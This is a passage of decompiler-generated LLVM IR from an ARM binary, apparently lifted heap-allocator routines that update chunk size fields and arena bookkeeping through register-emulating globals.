  br i1 %tmp40, label %.thread6, label %dec_label_pc_12494

dec_label_pc_12494:                               ; preds = %dec_label_pc_1247c
  %v0_12494 = load i32, i32* @r5, align 4
  %v1_12494 = add i32 %v0_12494, 20
  %v2_12494 = inttoptr i32 %v1_12494 to i32*
  %v3_12494 = load i32, i32* %v2_12494, align 4
  store i32 %v3_12494, i32* %r3.global-to-local, align 4
  %v1_12498 = load i32, i32* %r1.global-to-local, align 4
  %v2_12498 = add i32 %v1_12498, 20
  %v3_12498 = inttoptr i32 %v2_12498 to i32*
  store i32 %v3_12494, i32* %v3_12498, align 4
  %v0_1249c = load i32, i32* @r5, align 4
  %v1_1249c = add i32 %v0_1249c, 24
  %v2_1249c = inttoptr i32 %v1_1249c to i32*
  %v3_1249c = load i32, i32* %v2_1249c, align 4
  store i32 %v3_1249c, i32* %r3.global-to-local, align 4
  %v1_124a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_124a0 = add i32 %v1_124a0, 24
  %v3_124a0 = inttoptr i32 %v2_124a0 to i32*
  store i32 %v3_1249c, i32* %v3_124a0, align 4
  %v0_124a4 = load i32, i32* @ip, align 4
  %v7_124a4 = icmp eq i32 %v0_124a4, 9
  br i1 %v7_124a4, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_12494
  %v1_124a8 = load i32, i32* @r5, align 4
  %v2_124a8 = add i32 %v1_124a8, 28
  %v3_124a8 = inttoptr i32 %v2_124a8 to i32*
  %v4_124a8 = load i32, i32* %v3_124a8, align 4
  store i32 %v4_124a8, i32* %r3.global-to-local, align 4
  %v2_124ac = load i32, i32* %r1.global-to-local, align 4
  %v3_124ac = add i32 %v2_124ac, 28
  %v4_124ac = inttoptr i32 %v3_124ac to i32*
  store i32 %v4_124a8, i32* %v4_124ac, align 4
  %v1_124b0 = load i32, i32* @r5, align 4
  %v2_124b0 = add i32 %v1_124b0, 32
  %v3_124b0 = inttoptr i32 %v2_124b0 to i32*
  %v4_124b0 = load i32, i32* %v3_124b0, align 4
  store i32 %v4_124b0, i32* %r3.global-to-local, align 4
  %v2_124b4 = load i32, i32* %r1.global-to-local, align 4
  %v3_124b4 = add i32 %v2_124b4, 32
  %v4_124b4 = inttoptr i32 %v3_124b4 to i32*
  store i32 %v4_124b0, i32* %v4_124b4, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_12494, %dec_label_pc_1247c, %dec_label_pc_1245c, %dec_label_pc_12450, %bb32
  %v0_124b8 = load i32, i32* @r5, align 4
  store i32 %v0_124b8, i32* @r0, align 4
  %v0_124bc = call i32 @function_128a8()
  store i32 %v0_124bc, i32* %r0.global-to-local, align 4
  %v0_124c0 = load i32, i32* @r7, align 4
  %v1_124c0 = add i32 %v0_124c0, 8
  store i32 %v1_124c0, i32* @r4, align 4
  br label %dec_label_pc_125fc

dec_label_pc_124c8:                               ; preds = %bb30, %.thread2, %dec_label_pc_12408
  %v0_124dc = phi i32 [ %v3_12438, %.thread2 ], [ %v1_12350, %bb30 ], [ %v1_124c8.pre, %dec_label_pc_12408 ]
  %v0_124c8 = load i32, i32* @sb, align 4
  %v2_124c8 = sub i32 %v0_124dc, %v0_124c8
  store i32 %v2_124c8, i32* %r1.global-to-local, align 4
  %v0_124d0 = load i32, i32* @sl, align 4
  %v1_124d0 = add i32 %v0_124d0, 4
  %v2_124d0 = inttoptr i32 %v1_124d0 to i32*
  %v3_124d0 = load i32, i32* %v2_124d0, align 4
  %tmp41 = icmp ugt i32 %v2_124c8, 15
  %v1_124f8 = urem i32 %v3_124d0, 2
  store i32 %v1_124f8, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_124f8, label %dec_label_pc_124d8

dec_label_pc_124d8:                               ; preds = %dec_label_pc_124c8
  %v2_124dc = or i32 %v1_124f8, %v0_124dc
  store i32 %v2_124dc, i32* %r3.global-to-local, align 4
  store i32 %v2_124dc, i32* %v2_124d0, align 4
  %v0_124e4 = load i32, i32* @sl, align 4
  %v1_124e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_124e4 = add i32 %v1_124e4, %v0_124e4
  store i32 %v2_124e4, i32* %r2.global-to-local, align 4
  %v1_124e8 = add i32 %v2_124e4, 4
  %v2_124e8 = inttoptr i32 %v1_124e8 to i32*
  %v3_124e8 = load i32, i32* %v2_124e8, align 4
  %v1_124ec = or i32 %v3_124e8, 1
  store i32 %v1_124ec, i32* %r3.global-to-local, align 4
  store i32 %v1_124ec, i32* %v2_124e8, align 4
  br label %dec_label_pc_12528

dec_label_pc_124f8:                               ; preds = %dec_label_pc_124c8
  %v2_124fc = add i32 %v0_124d0, %v0_124c8
  store i32 %v2_124fc, i32* %r0.global-to-local, align 4
  %v2_12500 = or i32 %v1_124f8, %v0_124c8
  store i32 %v2_12500, i32* %r3.global-to-local, align 4
  %v1_12504 = or i32 %v2_124c8, 1
  store i32 %v1_12504, i32* %r2.global-to-local, align 4
  store i32 %v2_12500, i32* %v2_124d0, align 4
  %v0_1250c = load i32, i32* %r2.global-to-local, align 4
  %v1_1250c = load i32, i32* %r0.global-to-local, align 4
  %v2_1250c = add i32 %v1_1250c, 4
  %v3_1250c = inttoptr i32 %v2_1250c to i32*
  store i32 %v0_1250c, i32* %v3_1250c, align 4
  %v0_12510 = load i32, i32* %r0.global-to-local, align 4
  %v1_12510 = load i32, i32* %r1.global-to-local, align 4
  %v2_12510 = add i32 %v1_12510, %v0_12510
  store i32 %v2_12510, i32* %r2.global-to-local, align 4
  %v1_12514 = add i32 %v2_12510, 4
  %v2_12514 = inttoptr i32 %v1_12514 to i32*
  %v3_12514 = load i32, i32* %v2_12514, align 4
  %v1_12518 = or i32 %v3_12514, 1
  store i32 %v1_12518, i32* %r3.global-to-local, align 4
  store i32 %v1_12518, i32* %v2_12514, align 4
  %v0_12520 = load i32, i32* %r0.global-to-local, align 4
  %v1_12520 = add i32 %v0_12520, 8
  store i32 %v1_12520, i32* @r0, align 4
  %v0_12524 = call i32 @function_128a8()
  store i32 %v0_12524, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12528

dec_label_pc_12528:                               ; preds = %dec_label_pc_124d8, %dec_label_pc_124f8
  %v0_12528 = load i32, i32* @sl, align 4
  %v1_12528 = add i32 %v0_12528, 8
  store i32 %v1_12528, i32* @r4, align 4
  br label %dec_label_pc_125fc

dec_label_pc_12530:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74408), i32* %r1.global-to-local, align 4
  %v4_12538 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74440) to i32*), align 4
  store i32 %v4_12538, i32* @r8, align 4
  %v2_1253c = inttoptr i32 %v1_1234c to i32*
  %v3_1253c = load i32, i32* %v2_1253c, align 4
  store i32 %v3_1253c, i32* @r4, align 4
  %v1_12540 = add i32 %v4_12538, 860
  %v2_12540 = inttoptr i32 %v1_12540 to i32*
  %v3_12540 = load i32, i32* %v2_12540, align 4
  %v1_12544 = add i32 %v3_1253c, 4
  %v1_12548 = add i32 %v3_12540, -1
  store i32 %v1_12548, i32* %r2.global-to-local, align 4
  %v2_1254c = add i32 %v1_12544, %v1_12548
  %v1_12550 = load i32, i32* @sb, align 4
  %v2_12550 = add i32 %v2_1254c, %v1_12550
  store i32 %v2_12550, i32* %r3.global-to-local, align 4
  %v2_12554 = sub i32 0, %v3_12540
  %v3_12554 = and i32 %v2_12550, %v2_12554
  store i32 %v3_12554, i32* @r7, align 4
  %v2_12558 = sub i32 %v3_12554, %v3_1253c
  store i32 %v2_12558, i32* @fp, align 4
  %v9_1255c = icmp eq i32 %v1_12350, %v2_12558
  br i1 %v9_1255c, label %dec_label_pc_125d0, label %dec_label_pc_12564

dec_label_pc_12564:                               ; preds = %dec_label_pc_12530
  %v2_12564 = sub i32 %v1_1234c, %v3_1253c
  store i32 %v2_12564, i32* %r0.global-to-local, align 4
  %v2_12568 = add i32 %v3_1253c, %v1_12350
  store i32 %v2_12568, i32* %r1.global-to-local, align 4
  store i32 %v3_12554, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12574 = call i32 @function_140f4(i32 %v2_12564, i32 %v2_12568, i32 %v3_12554, i32 1)
  store i32 %v4_12574, i32* %r0.global-to-local, align 4
  %v7_12578 = icmp eq i32 %v4_12574, -1
  br i1 %v7_12578, label %dec_label_pc_125c4, label %dec_label_pc_12580

dec_label_pc_12580:                               ; preds = %dec_label_pc_12564
  %v1_12580 = load i32, i32* @r4, align 4
  %v2_12580 = add i32 %v1_12580, %v4_12574
  store i32 %v2_12580, i32* %r0.global-to-local, align 4
  %v0_12584 = load i32, i32* @fp, align 4
  %v1_12584 = or i32 %v0_12584, 2
  store i32 %v1_12584, i32* %r3.global-to-local, align 4
  %v2_12588 = add i32 %v2_12580, 4
  %v3_12588 = inttoptr i32 %v2_12588 to i32*
  store i32 %v1_12584, i32* %v3_12588, align 4
  %v0_1258c = load i32, i32* @r8, align 4
  %v1_1258c = add i32 %v0_1258c, 868
  %v2_1258c = inttoptr i32 %v1_1258c to i32*
  %v3_1258c = load i32, i32* %v2_1258c, align 4
  store i32 %v3_1258c, i32* %r3.global-to-local, align 4
  %v1_12590 = add i32 %v0_1258c, 880
  %v2_12590 = inttoptr i32 %v1_12590 to i32*
  %v3_12590 = load i32, i32* %v2_12590, align 4
  store i32 %v3_12590, i32* %r2.global-to-local, align 4
  %v0_12594 = load i32, i32* @r6, align 4
  %v2_12594 = sub i32 %v3_1258c, %v0_12594
  store i32 %v2_12594, i32* %r3.global-to-local, align 4
  %v1_12598 = load i32, i32* @r7, align 4
  %v2_12598 = add i32 %v1_12598, %v2_12594
  store i32 %v2_12598, i32* %r1.global-to-local, align 4
  %v1_1259c = add i32 %v0_1258c, 872
  %v2_1259c = inttoptr i32 %v1_1259c to i32*
  %v3_1259c = load i32, i32* %v2_1259c, align 4
  store i32 %v3_1259c, i32* %r3.global-to-local, align 4
  %v1_125a4 = add i32 %v0_1258c, 884
  %v2_125a4 = inttoptr i32 %v1_125a4 to i32*
  %v3_125a4 = load i32, i32* %v2_125a4, align 4
  store i32 %v3_125a4, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12598, %v3_12590
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12580
  store i32 %v2_12598, i32* %v2_12590, align 4
  %v0_125ac.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_125ac.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12580, %bb33
  %v1_125ac = phi i32 [ %v0_1258c, %dec_label_pc_12580 ], [ %v1_125ac.pre, %bb33 ]
  %v0_125ac = phi i32 [ %v2_12598, %dec_label_pc_12580 ], [ %v0_125ac.pre, %bb33 ]
  %v2_125ac = add i32 %v1_125ac, 868
  %v3_125ac = inttoptr i32 %v2_125ac to i32*
  store i32 %v0_125ac, i32* %v3_125ac, align 4
  %v0_125b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_125b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_125b0 = add i32 %v1_125b0, %v0_125b0
  store i32 %v2_125b0, i32* %r1.global-to-local, align 4
  %v1_125b4 = load i32, i32* %r2.global-to-local, align 4
  %v0_125b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_125b8 = add i32 %v0_125b8, 8
  store i32 %v1_125b8, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_125b0, %v1_125b4
  br i1 %tmp43, label %bb35, label %dec_label_pc_125fc

bb35:                                             ; preds = %bb34
  %v5_125bc = load i32, i32* @r8, align 4
  %v6_125bc = add i32 %v5_125bc, 884
  %v7_125bc = inttoptr i32 %v6_125bc to i32*
  store i32 %v2_125b0, i32* %v7_125bc, align 4
  br label %dec_label_pc_125fc

dec_label_pc_125c4:                               ; preds = %dec_label_pc_12564
  %v0_125c4 = load i32, i32* @sb, align 4
  %v1_125c4 = add i32 %v0_125c4, 4
  store i32 %v1_125c4, i32* %r3.global-to-local, align 4
  %v0_125c8 = load i32, i32* @r6, align 4
  %v3_125c8 = icmp ult i32 %v0_125c8, %v1_125c4
  br i1 %v3_125c8, label %dec_label_pc_125d8, label %dec_label_pc_125c4.dec_label_pc_125d0_crit_edge

dec_label_pc_125c4.dec_label_pc_125d0_crit_edge:  ; preds = %dec_label_pc_125c4
  %v0_125d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_125d0

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125c4.dec_label_pc_125d0_crit_edge, %dec_label_pc_12530
  %v0_125d0 = phi i32 [ %v0_125d0.pre, %dec_label_pc_125c4.dec_label_pc_125d0_crit_edge ], [ %v0_12338, %dec_label_pc_12530 ]
  store i32 %v0_125d0, i32* @r4, align 4
  br label %dec_label_pc_125fc

dec_label_pc_125d8:                               ; preds = %dec_label_pc_125c4
  %v1_125d8 = add i32 %v0_125c4, -7
  store i32 %v1_125d8, i32* @r0, align 4
  %v0_125dc = call i32 @function_1183c()
  store i32 %v0_125dc, i32* @r0, align 4
  store i32 %v0_125dc, i32* @r4, align 4
  %v2_125e0 = icmp eq i32 %v0_125dc, 0
  br i1 %v2_125e0, label %dec_label_pc_125fc, label %dec_label_pc_125e8

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125d8
  %v0_125e8 = load i32, i32* @r6, align 4
  %v1_125e8 = add i32 %v0_125e8, -8
  store i32 %v1_125e8, i32* @r2, align 4
  %v0_125ec = load i32, i32* @r5, align 4
  store i32 %v0_125ec, i32* @r1, align 4
  %v0_125f0 = call i32 @function_11310()
  %v0_125f4 = load i32, i32* @r5, align 4
  store i32 %v0_125f4, i32* @r0, align 4
  %v0_125f8 = call i32 @function_128a8()
  store i32 %v0_125f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125fc

dec_label_pc_125fc:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_125d8, %dec_label_pc_125d0, %dec_label_pc_12528, %.thread6, %dec_label_pc_12398, %dec_label_pc_125e8
  store i32 %v2_122ec, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74408), i32* %r2.global-to-local, align 4
  %v4_1260c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74432) to i32*), align 4
  store i32 %v4_1260c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_1260c)
  br label %dec_label_pc_12618

dec_label_pc_12618:                               ; preds = %dec_label_pc_122c8, %dec_label_pc_122b0, %dec_label_pc_12320, %dec_label_pc_125fc
  %v0_12618 = load i32, i32* @r4, align 4
  store i32 %v0_12618, i32* %r0.global-to-local, align 4
  store i32 %v3_12290, i32* @r4, align 4
  store i32 %v6_12290, i32* @r5, align 4
  store i32 %v9_12290, i32* @r6, align 4
  store i32 %v12_12290, i32* @r7, align 4
  store i32 %v15_12290, i32* @r8, align 4
  store i32 %v18_12290, i32* @sb, align 4
  store i32 %v21_12290, i32* @sl, align 4
  store i32 %v24_12290, i32* @fp, align 4
  store i32 %v27_12290, i32* @lr, align 4
  ret i32 %v0_12618

; uselistorder directives
  uselistorder i32 %v2_125b0, { 1, 0, 2 }
  uselistorder i32 %v2_12598, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12574, { 1, 0, 2 }
  uselistorder i32 %v3_12554, { 1, 0, 2, 3 }
  uselistorder i32 %v1_124f8, { 2, 1, 0 }
  uselistorder i32 %v2_124c8, { 1, 0, 2 }
  uselistorder i32 %v0_1245c, { 1, 0 }
  uselistorder i32 %v0_12418, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_1237c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12374, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12358, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12350, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_1234c, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_1233c, { 1, 0 }
  uselistorder i32 %v0_12338, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12318, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 13, 14, 15, 16, 17 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 13, 14, 15, 9, 10 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 0, 7, 12, 8, 9, 10, 11, 26, 1, 20, 19, 25, 27, 21, 22, 23, 24, 13, 16, 15, 14, 17, 18 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74440) to i32*), { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_c4ec.387 to i32), i32 74408), { 2, 3, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_12618, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_125fc, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12528, { 1, 0 }
  uselistorder label %dec_label_pc_124c8, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12414, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12408, { 1, 0 }
  uselistorder label %dec_label_pc_12404, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_1262c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1262c:
  %v0_1262c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1262c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1262c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1262c, %bb
  %v10_12640 = phi i32 [ %arg1, %dec_label_pc_1262c ], [ 0, %bb ]
  ret i32 %v10_12640

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_12644(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12644:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12644 = add i32 %arg2, 44
  %v2_12644 = inttoptr i32 %v1_12644 to i32*
  %v3_12644 = load i32, i32* %v2_12644, align 4
  %v1_1264c = add i32 %v3_12644, 4
  %v2_1264c = inttoptr i32 %v1_1264c to i32*
  %v3_1264c = load i32, i32* %v2_1264c, align 4
  %v1_12650 = add i32 %arg2, 860
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  %v3_12650 = load i32, i32* %v2_12650, align 4
  store i32 %v3_12650, i32* @r4, align 4
  %v1_12654 = and i32 %v3_1264c, -4
  store i32 %v1_12654, i32* @r6, align 4
  %v1_12658 = add i32 %v1_12654, -17
  %v2_1265c = add i32 %v1_12658, %v3_12650
  store i32 %arg2, i32* @r5, align 4
  %v2_12668 = sub i32 %v2_1265c, %arg1
  store i32 %v2_12668, i32* @r0, align 4
  store i32 %v3_12650, i32* @r1, align 4
  %v0_12670 = call i32 @function_10878()
  %v1_12674 = add i32 %v0_12670, -1
  store i32 %v1_12674, i32* %r0.global-to-local, align 4
  %v0_12678 = load i32, i32* @r4, align 4
  %v2_12678 = mul i32 %v0_12678, %v1_12674
  store i32 %v2_12678, i32* %r7.global-to-local, align 4
  %v2_1267c = icmp eq i32 %v2_12678, 0
  store i1 %v2_1267c, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12678, 1
  br i1 %tmp8, label %dec_label_pc_126e4, label %dec_label_pc_12684

dec_label_pc_12684:                               ; preds = %dec_label_pc_12644
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12688 = call i32 @function_13db0(i32 0)
  store i32 %v1_12688, i32* %r0.global-to-local, align 4
  %v0_1268c = load i32, i32* @r5, align 4
  %v1_1268c = add i32 %v0_1268c, 44
  %v2_1268c = inttoptr i32 %v1_1268c to i32*
  %v3_1268c = load i32, i32* %v2_1268c, align 4
  %v0_12690 = load i32, i32* @r6, align 4
  %v2_12690 = add i32 %v0_12690, %v3_1268c
  %v9_12694 = icmp eq i32 %v1_12688, %v2_12690
  store i1 %v9_12694, i1* @cpsr_z, align 1
  store i32 %v1_12688, i32* @r4, align 4
  br i1 %v9_12694, label %dec_label_pc_126a0, label %dec_label_pc_126e4

dec_label_pc_126a0:                               ; preds = %dec_label_pc_12684
  %v0_126a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_126a0 = sub i32 0, %v0_126a0
  store i32 %v1_126a0, i32* %r0.global-to-local, align 4
  %v1_126a4 = call i32 @function_13db0(i32 %v1_126a0)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_126ac = call i32 @function_13db0(i32 0)
  store i32 %v1_126ac, i32* %r0.global-to-local, align 4
  %v7_126b0 = icmp eq i32 %v1_126ac, -1
  store i1 %v7_126b0, i1* @cpsr_z, align 1
  br i1 %v7_126b0, label %dec_label_pc_126e4, label %dec_label_pc_126b8

dec_label_pc_126b8:                               ; preds = %dec_label_pc_126a0
  %v0_126b8 = load i32, i32* @r4, align 4
  %v2_126b8 = sub i32 %v0_126b8, %v1_126ac
  store i32 %v2_126b8, i32* %r0.global-to-local, align 4
  %v9_126b8 = icmp eq i32 %v0_126b8, %v1_126ac
  store i1 %v9_126b8, i1* @cpsr_z, align 1
  br i1 %v9_126b8, label %dec_label_pc_126e4, label %dec_label_pc_126c0

dec_label_pc_126c0:                               ; preds = %dec_label_pc_126b8
  %v0_126c0 = load i32, i32* @r5, align 4
  %v1_126c0 = add i32 %v0_126c0, 872
  %v2_126c0 = inttoptr i32 %v1_126c0 to i32*
  %v3_126c0 = load i32, i32* %v2_126c0, align 4
  %v1_126c4 = load i32, i32* @r6, align 4
  %v2_126c4 = sub i32 %v1_126c4, %v2_126b8
  store i32 %v2_126c4, i32* %r2.global-to-local, align 4
  %v1_126c8 = add i32 %v0_126c0, 44
  %v2_126c8 = inttoptr i32 %v1_126c8 to i32*
  %v3_126c8 = load i32, i32* %v2_126c8, align 4
  store i32 %v3_126c8, i32* %r1.global-to-local, align 4
  %v2_126cc = sub i32 %v3_126c0, %v2_126b8
  %v1_126d0 = or i32 %v2_126c4, 1
  store i32 %v1_126d0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_126cc, i32* %v2_126c0, align 4
  %v0_126dc = load i32, i32* %r2.global-to-local, align 4
  %v1_126dc = load i32, i32* %r1.global-to-local, align 4
  %v2_126dc = add i32 %v1_126dc, 4
  %v3_126dc = inttoptr i32 %v2_126dc to i32*
  store i32 %v0_126dc, i32* %v3_126dc, align 4
  %v1_126f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126e8

dec_label_pc_126e4:                               ; preds = %dec_label_pc_12684, %dec_label_pc_126b8, %dec_label_pc_126a0, %dec_label_pc_12644
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126e8

dec_label_pc_126e8:                               ; preds = %dec_label_pc_126c0, %dec_label_pc_126e4
  %v1_126f0 = phi i32 [ %v1_126f0.pre, %dec_label_pc_126c0 ], [ 0, %dec_label_pc_126e4 ]
  ret i32 %v1_126f0

; uselistorder directives
  uselistorder i1 %v7_126b0, { 1, 0 }
  uselistorder i32 %v1_126ac, { 2, 1, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @function_13db0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_126e8, { 1, 0 }
  uselistorder label %dec_label_pc_126e4, { 1, 2, 0, 3 }
}

define i32 @function_126f4() local_unnamed_addr {
dec_label_pc_126f4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_126f4 = load i32, i32* @r4, align 4
  store i32 %v3_126f4, i32* %stack_var_-36, align 4
  %v0_126f8 = load i32, i32* @r0, align 4
  %v1_126f8 = inttoptr i32 %v0_126f8 to i32*
  %v2_126f8 = load i32, i32* %v1_126f8, align 4
  store i32 %v2_126f8, i32* %r3.global-to-local, align 4
  %v2_126fc = icmp eq i32 %v2_126f8, 0
  store i32 %v0_126f8, i32* @r4, align 4
  br i1 %v2_126fc, label %dec_label_pc_12834.preheader, label %dec_label_pc_12710

dec_label_pc_12834.preheader:                     ; preds = %dec_label_pc_126f4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1283c25 = add i32 %v0_126f8, 52
  store i32 %v1_1283c25, i32* %r3.global-to-local, align 4
  %v2_1284426 = add i32 %v0_126f8, 60
  %v3_1284427 = inttoptr i32 %v2_1284426 to i32*
  store i32 %v1_1283c25, i32* %v3_1284427, align 4
  %v0_1284828 = load i32, i32* %r3.global-to-local, align 4
  %v2_1284829 = add i32 %v0_1284828, 12
  %v3_1284830 = inttoptr i32 %v2_1284829 to i32*
  store i32 %v0_1284828, i32* %v3_1284830, align 4
  br label %dec_label_pc_12834.dec_label_pc_12834_crit_edge

dec_label_pc_12710:                               ; preds = %dec_label_pc_126f4
  %v1_12710 = and i32 %v2_126f8, -3
  %v3_12714 = udiv i32 %v2_126f8, 8
  store i32 %v3_12714, i32* %r2.global-to-local, align 4
  store i32 %v1_12710, i32* %v1_126f8, align 4
  %v0_1271c = load i32, i32* @r0, align 4
  %v1_1271c = add i32 %v0_1271c, -4
  store i32 %v1_1271c, i32* %r3.global-to-local, align 4
  %v1_12720 = load i32, i32* %r2.global-to-local, align 4
  %v4_12720 = mul i32 %v1_12720, 4
  %v5_12720 = add i32 %v4_12720, %v1_1271c
  store i32 %v5_12720, i32* %sb.global-to-local, align 4
  %v1_12724 = add i32 %v0_1271c, 52
  store i32 %v1_12724, i32* %r7.global-to-local, align 4
  %v1_12728 = add i32 %v0_1271c, 4
  store i32 %v1_12728, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12730

dec_label_pc_12730:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_12710
  %v1_1282410 = phi i32 [ %v1_12824, %dec_label_pc_1282c ], [ %v5_12720, %dec_label_pc_12710 ]
  %v1_1273c = phi i32 [ %v1_1282c, %dec_label_pc_1282c ], [ %v1_12728, %dec_label_pc_12710 ]
  %v1_12730 = inttoptr i32 %v1_1273c to i32*
  %v2_12730 = load i32, i32* %v1_12730, align 4
  store i32 %v2_12730, i32* %r1.global-to-local, align 4
  %v2_12734 = icmp eq i32 %v2_12730, 0
  br i1 %v2_12734, label %dec_label_pc_12824, label %dec_label_pc_1273c

dec_label_pc_1273c:                               ; preds = %dec_label_pc_12730
  %v0_1273c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1273c, i32* %v1_12730, align 4
  %v0_12740.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12740

dec_label_pc_12740:                               ; preds = %dec_label_pc_12818, %dec_label_pc_1273c
  %v0_1275c = phi i32 [ %v0_12818, %dec_label_pc_12818 ], [ %v0_12740.pre, %dec_label_pc_1273c ]
  %v1_12740 = add i32 %v0_1275c, 4
  %v2_12740 = inttoptr i32 %v1_12740 to i32*
  %v3_12740 = load i32, i32* %v2_12740, align 4
  store i32 %v3_12740, i32* %r3.global-to-local, align 4
  %v1_12744 = and i32 %v3_12740, -2
  store i32 %v1_12744, i32* %lr.global-to-local, align 4
  %v2_12748 = add i32 %v1_12744, %v0_1275c
  store i32 %v2_12748, i32* @r0, align 4
  %v1_1274c = urem i32 %v3_12740, 2
  %v2_1274c = icmp eq i32 %v1_1274c, 0
  %v1_12750 = add i32 %v0_1275c, 8
  %v2_12750 = inttoptr i32 %v1_12750 to i32*
  %v3_12750 = load i32, i32* %v2_12750, align 4
  store i32 %v3_12750, i32* %sl.global-to-local, align 4
  %v1_12754 = add i32 %v2_12748, 4
  %v2_12754 = inttoptr i32 %v1_12754 to i32*
  %v3_12754 = load i32, i32* %v2_12754, align 4
  store i32 %v3_12754, i32* %r8.global-to-local, align 4
  br i1 %v2_1274c, label %dec_label_pc_1275c, label %dec_label_pc_12790

